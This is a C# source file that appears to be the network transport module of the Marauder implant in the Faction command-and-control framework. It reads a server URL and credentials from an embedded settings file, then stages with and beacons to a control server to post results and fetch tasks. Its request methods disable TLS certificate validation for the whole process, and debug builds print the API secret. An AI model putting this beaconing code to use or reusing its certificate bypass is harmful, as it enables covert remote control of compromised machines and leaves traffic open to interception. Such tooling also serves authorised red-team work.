using System;
using System.IO;
using System.Text;
using System.Net;
using System.Collections.Generic;
using System.Reflection;
using Newtonsoft.Json;
using Faction.Modules.Dotnet.Common;

namespace Faction.Modules.Dotnet
{
  public class DIRECT : AgentTransport
  {
    public override string Name { get { return "DIRECT"; } }
    public string Url;
    public string KeyName;
    public string Secret;
    public bool Debug;

    public DIRECT(){
#if DEBUG
      Console.WriteLine($"[Marauder DIRECT Transport] Creating DIRECT Transport");
      Console.WriteLine($"[Marauder DIRECT Transport] Loading Settings..");
#endif
      Stream settingsStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("DIRECT.settings.json");
  
      Dictionary<string, string> settings = JsonConvert.DeserializeObject<Dictionary<string, string>>((new StreamReader(settingsStream)).ReadToEnd());

      Url = settings["ApiUrl"];
#if DEBUG
      Console.WriteLine($"[Marauder DIRECT Transport] Api URL: {Url}");
#endif
      
      KeyName = settings["ApiKeyName"];
#if DEBUG
      Console.WriteLine($"[Marauder DIRECT Transport] Api Key Name: {KeyName}");
#endif
      Secret = settings["ApiSecret"];
#if DEBUG
      Console.WriteLine($"[Marauder DIRECT Transport] Api Secret: {Secret}");
#endif
      Debug = Boolean.Parse(settings["Debug"]);
#if DEBUG
      Console.WriteLine($"[Marauder DIRECT Transport] Debug: {Debug}");
#endif
    }

    public override string Stage(string StageName, string StagingId, string Message)
    {
      // Disable Cert Check
      ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
      string stagingUrl = $"{this.Url}/api/v1/staging/{StageName}/{StagingId}/";
      WebClient wc = new WebClient();
      wc.Headers[HttpRequestHeader.ContentType] = "application/json";
      string authHeader = Convert.ToBase64String(Encoding.UTF8.GetBytes(String.Format("{0}:{1}", KeyName, Secret)));
      wc.Headers[HttpRequestHeader.Authorization] = String.Format("Basic {0}", authHeader);

      Dictionary<string, string> responseDict = new Dictionary<string, string>();
      string jsonMessage = $"{{\"Message\": \"{Message}\"}}";
      try
      {
#if DEBUG
        Console.WriteLine($"[Marauder DIRECT Transport] Staging URL: {stagingUrl}");
        Console.WriteLine($"[Marauder DIRECT Transport] Key Name: {KeyName}");
        Console.WriteLine($"[Marauder DIRECT Transport] Secret: {Secret}");
        Console.WriteLine($"[Marauder DIRECT Transport] Sending Staging Message: {jsonMessage}");
#endif
        string response = wc.UploadString(stagingUrl, jsonMessage);

#if DEBUG
        Console.WriteLine($"[Marauder DIRECT Transport] Got Response: {response}");
#endif
        responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);

      }
      catch (Exception e)
      {
#if DEBUG
        Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
#endif
        responseDict["Message"] = "ERROR";
      }
      return responseDict["Message"];
    }
    public override string Beacon(string AgentName, string Message)
    {
      // Disable cert check
      ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
      string beaconUrl = $"{this.Url}/api/v1/agent/{AgentName}/checkin/";

      WebClient wc = new WebClient();
      wc.Headers[HttpRequestHeader.ContentType] = "application/json";
      string authHeader = Convert.ToBase64String(Encoding.UTF8.GetBytes(String.Format("{0}:{1}", KeyName, Secret)));
      wc.Headers[HttpRequestHeader.Authorization] = String.Format("Basic {0}", authHeader);

      Dictionary<string, string> responseDict = new Dictionary<string, string>();
      if (!String.IsNullOrEmpty(Message))
      {
        try
        {
          string jsonMessage = $"{{\"Message\": \"{Message}\"}}";

#if DEBUG
          Console.WriteLine($"[Marauder DIRECT Transport] Beacon URL: {beaconUrl}");
          Console.WriteLine($"[Marauder DIRECT Transport] Key Name: {KeyName}");
          Console.WriteLine($"[Marauder DIRECT Transport] Secret: {Secret}");
          Console.WriteLine($"[Marauder DIRECT Transport] POSTING Checkin: {jsonMessage}");
#endif
          string response = wc.UploadString(beaconUrl, jsonMessage);
          responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
        }
        catch (Exception e)
        {
#if DEBUG
          Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
#endif
          responseDict["Message"] = "ERROR";
        }
      }
      else
      {
        try
        {
#if DEBUG
          Console.WriteLine($"[Marauder DIRECT Transport] GETTING Checkin..");
#endif
          string response = wc.DownloadString(beaconUrl);
          responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
        }
        catch (Exception e)
        {
#if DEBUG
          Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
#endif
          responseDict["Message"] = "ERROR";
        }
      }
      return responseDict["Message"];
    }
  }

  public class Initialize {
    public static List<AgentTransport> GetTransports()
    {
#if DEBUG
      Console.WriteLine($"[Marauder DIRECT Transport] Initializing..");
#endif

      List<AgentTransport> transports = new List<AgentTransport>();
      transports.Add(new DIRECT());
      return transports;
    }
  }
}